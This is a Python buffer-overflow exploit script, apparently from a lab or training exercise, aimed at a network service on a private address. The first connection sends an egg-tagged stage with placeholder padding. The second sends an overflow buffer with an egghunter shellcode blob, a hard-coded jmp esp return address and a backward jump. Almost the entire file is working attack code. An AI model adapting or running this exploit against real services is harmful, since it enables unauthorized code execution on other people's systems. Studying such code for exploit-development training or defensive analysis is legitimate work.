#!/usr/bin/python
# -*- coding: utf-8 -*-
#badchars = \x00

import sys, socket; from struct import *

host = "192.168.50.188"
port = 7274

max_size = 192
offset = 143

payload  = "\x90" * 3

buf =  b""
buf += b"\xeb\x1e\x59\x31\xdb\x64\x8b\x03\x50\x5c\x51\x51"
buf += b"\x68\x5c\x58\xc3\x90\x68\xea\x17\x74\x72\x68\x58"
buf += b"\x58\xeb\x04\x64\x89\x23\xeb\x14\x31\xd2\xe8\xdb"
buf += b"\xff\xff\xff\x83\xec\x14\x31\xdb\x64\x89\x23\x8b"
buf += b"\x54\x24\x18\x42\x66\x81\xca\xff\x0f\x42\x89\x54"
buf += b"\x24\x18\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75\xf1"
buf += b"\xaf\x75\xee\xff\xe7"

payload += buf # egghunter

payload += "A" * (offset - len(payload))
payload += pack('<L', 0x7274146F) # jmp esp
payload += "\x90" * 8
payload += "\xE9\x60\xFF\xFF\xFF" #jmp back de 155 bytes
payload += "C" * (max_size - len(payload))

buffer  = "EXPLOIT3 "
buffer += payload
buffer += ">"


# EGGHUNTER =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
shellcode  = "EXPLOIT4 "
shellcode += "T00WT00W"
shellcode += "C" * 400

con1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con1.connect((host, port))

print("[+] Enviando shellcode...")

con1.recv(4096)
con1.send(shellcode)
con1.close()
#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host, port))

print("[+] Enviando exploit...")

exp.recv(4096)
exp.send(buffer)
exp.close()